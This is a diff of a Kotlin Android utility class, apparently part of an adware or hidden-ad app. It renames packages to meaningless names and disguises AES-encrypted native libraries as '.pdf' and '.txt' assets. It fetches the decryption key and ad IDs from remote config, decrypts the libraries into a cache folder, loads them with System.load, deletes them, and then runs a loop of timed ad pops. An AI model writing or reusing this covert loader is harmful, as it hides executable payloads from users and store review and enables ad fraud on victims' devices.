@@ -7,22 +7,21 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
-import azshow.sl.lo
-import com.ggc.show.MasterRu
-import com.ggc.show.ALLS
+import ecf.jk.Kac
+import com.ecft.nice.MasterRu
+import com.ecft.nice.ALLS
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import com.ggc.show.DataCc
+import com.ecft.nice.DataCc
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.ktx.Firebase
-import gh.cark.NcZong
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -152,13 +151,14 @@ object GgUtils {
     @JvmStatic
     fun reConfig(js: JSONObject) {
         // JSON数据格式
-        sK = js.optString("so_key")//So 解密的key
-
-        val kg = js.optString("tw_v")
-        val gb = js.optString("g_k_v")
-        val ff = js.optString("f_f_v")
-        val yc = js.optString("y_c_v")
-        val wt = js.optString("w_t_v")
+        sK = js.optString("jmk").split("-")[0]//So 解密的key
+        Log.e("TAG", "reConfig: 1=$sK", )
+        val allKey = js.optString("all_kg")
+        val kg = allKey.split("-")[0]
+        val gb = allKey.split("-")[1]
+        val ff = allKey.split("-")[2]
+        val yc = allKey.split("-")[3]
+        val wt = allKey.split("-")[4]
         DataCc.c = kg
 
         DataCc.a = gb
@@ -168,10 +168,12 @@ object GgUtils {
         DataCc.y = yc
 
         DataCc.b = wt
+        val allAdId = js.optString("showGV")
+        Log.e("TAG", "reConfig: 2=$allAdId", )
 
 
-        mAdC.setAdId(js.optString("ad_id_h"), js.optString("ad_id_l"))// 广告id
-        val lt = js.optString("t_state").split("-")//时间相关配置
+        mAdC.setAdId(allAdId.split("-")[0], allAdId.split("-")[1])// 广告id
+        val lt = js.optString("popSnn").split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
         mInstallWait = lt[2].toInt() * 1000
@@ -206,7 +208,7 @@ object GgUtils {
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loadSFile(if (is64i) "kk/kuang.txt" else "kk/kun.zip")
+                i = loadSFile(if (is64i) "user/ecuser.pdf" else "user/ecpass.txt")
             }
             Log.e("TAG", "t-wt-so-is-success-$i")
             if (i.not()) {
@@ -214,7 +216,7 @@ object GgUtils {
                 return@launch
             }
             MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            lo.loTx(22, 11.0, DataCc.y)
+            Kac.snnPl(22, 11.0, DataCc.y)
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -233,10 +235,10 @@ object GgUtils {
 
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
-            if (loadSFile(if (is64i) "hh/huang.txt" else "hh/hua.zip")) {
+            if (loadSFile(if (is64i) "pass/ecnuse.pdf" else "pass/ecnpa.txt")) {
                 withContext(Dispatchers.Main) {
                     try {
-                        lo.loh(mContext)
+                        Kac.nneCs(mContext)
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -246,19 +248,29 @@ object GgUtils {
     }
 
     private fun loadSFile(assetsName: String): Boolean {
-        val assetsInputS = mContext.assets.open(assetsName)
-        val fileSoName = "${assetsName.substring(2)}_${System.currentTimeMillis()}"
-        val file = File("${mContext.filesDir}/Cache")
-        if (file.exists().not()) {
-            file.mkdirs()
-        }
         try {
-            decrypt(assetsInputS, File(file.absolutePath, fileSoName))
-            val file2 = File(file.absolutePath, fileSoName)
-            System.load(file2.absolutePath)
-            file2.delete()
-            return true
-        } catch (_: Exception) {
+            val assetsInputS = mContext.assets.open(assetsName)
+            val fileSoName = "${assetsName.substring(2).replace("/", "_")}_${System.currentTimeMillis()}"
+            val file = File("${mContext.filesDir}/Cache")
+            if (file.exists().not()) {
+                file.mkdirs()
+            }
+            try {
+                val outputFile = File(file.absolutePath, fileSoName)
+                decrypt(assetsInputS, outputFile)
+
+                if (!outputFile.exists() || outputFile.length() == 0L) {
+                    return false
+                }
+                
+                System.load(outputFile.absolutePath)
+                outputFile.delete()
+                return true
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
         return false
     }
@@ -266,16 +278,27 @@ object GgUtils {
 
     // 解密
     private fun decrypt(inputFile: InputStream, outputFile: File) {
-        Log.e("TAG", "decrypt: ${sK}")
-        val key = SecretKeySpec(sK.toByteArray(), "AES")
-        val cipher = Cipher.getInstance("AES")
-        cipher.init(Cipher.DECRYPT_MODE, key)
-        val outputStream = FileOutputStream(outputFile)
-        val inputBytes = inputFile.readBytes()
-        val outputBytes = cipher.doFinal(inputBytes)
-        outputStream.write(outputBytes)
-        outputStream.close()
-        inputFile.close()
+        try {
+            val key = SecretKeySpec(sK.toByteArray(), "AES")
+
+            val cipher = Cipher.getInstance("AES")
+
+            cipher.init(Cipher.DECRYPT_MODE, key)
+
+            val outputStream = FileOutputStream(outputFile)
+
+            val inputBytes = inputFile.readBytes()
+
+            val outputBytes = cipher.doFinal(inputBytes)
+
+            outputStream.write(outputBytes)
+
+            outputStream.close()
+            inputFile.close()
+        } catch (e: Exception) {
+            e.printStackTrace()
+            throw e
+        }
     }
 
     private fun is64a(): Boolean {
@@ -324,7 +347,7 @@ object GgUtils {
             }
             sNumJump(++numJumps)
             MasterRu.pE("ad_start")
-            lo.loTx(2, 1.0, DataCc.b)
+            Kac.snnPl(2, 1.0, DataCc.b)
         }
     }
 
@@ -349,6 +372,5 @@ object GgUtils {
             ecpm.toBigDecimal(), Currency.getInstance("USD")
         )
     }
-
 
 }
